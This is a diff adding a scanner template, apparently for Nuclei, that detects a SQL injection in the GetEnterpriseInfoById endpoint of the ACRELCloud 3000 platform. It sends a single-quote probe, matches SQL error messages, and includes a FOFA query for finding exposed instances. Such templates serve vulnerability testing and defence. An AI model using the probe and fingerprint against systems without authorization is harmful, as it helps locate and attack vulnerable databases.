@@ -1,0 +1,29 @@
+id: acrelcloud-3000-getenterpriseinfobyid-sqli
+
+info:
+  name: ACRELCloud 3000 GetEnterpriseInfoById - SQL Injection
+  author: qwtd
+  severity: high
+  description: |
+    ACRELCloud 3000 GetEnterpriseInfoById endpoint contains a SQL injection vulnerability. An attacker can execute arbitrary SQL queries to retrieve sensitive information from the database.
+  reference:
+    - https://github.com/wy876/POC/blob/main/%E5%AE%89%E7%A7%91%E7%91%9E/%E5%AE%89%E7%A7%91%E7%91%9E%E7%8E%AF%E4%BF%9D%E7%94%A8%E7%94%B5%E7%9B%91%E7%AE%A1%E4%BA%91%E5%B9%B3%E5%8F%B0GetEnterpriseInfoById%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+  metadata:
+    max-request: 1
+    fofa: body="myCss/phone.css"
+  tags: 安科瑞环保用电监管云平台
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/MainMonitor/GetEnterpriseInfoById?EnterpriseId=%27"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "SQL syntax"
+          - "MySQL"
+      - type: status
+        status:
+          - 200
